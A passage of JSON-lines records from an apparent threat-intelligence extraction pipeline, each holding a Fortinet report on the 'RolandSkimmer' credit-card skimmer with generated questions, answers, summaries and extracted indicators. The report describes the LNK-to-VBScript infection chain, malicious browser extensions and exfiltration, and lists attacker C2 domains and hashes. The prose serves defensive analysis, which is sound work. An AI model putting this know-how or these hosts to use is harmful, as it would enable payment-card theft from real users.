both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users in Bulgaria and leverages malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a \"wallet stealer\", it does target and steal financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria, primarily through malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a deceptive LNK file to initiate the infection, which deploys obfuscated scripts to establish persistent and covert access, allowing them to harvest and exfiltrate sensitive financial data. The targets are Microsoft Windows users, and the potential impact is high, as the malware can collect and steal credit card information, leading to financial loss and identity theft. The attackers' use of advanced techniques, such as obfuscated VBScripts and XOR-encoded files, makes detection and mitigation challenging, emphasizing the need for robust security measures to prevent such infections.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "apt", "bank", "botnet", "malicious", "banking trojan", "threat", "phishing", "browser", "analysis"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users through malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a wallet stealer, it has similar goals of stealing financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including obfuscated scripts, XOR-encoded files, and deceptive naming strategies to evade detection and maintain persistence. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to significant financial losses and identity theft. The attackers' use of legitimate system tools and scripting capabilities allows them to achieve stealth, persistence, and data exfiltration, making this threat highly severe.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "browser", "apt", "malicious", "threat", "botnet", "bank", "banking trojan", "phishing", "analysis"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server 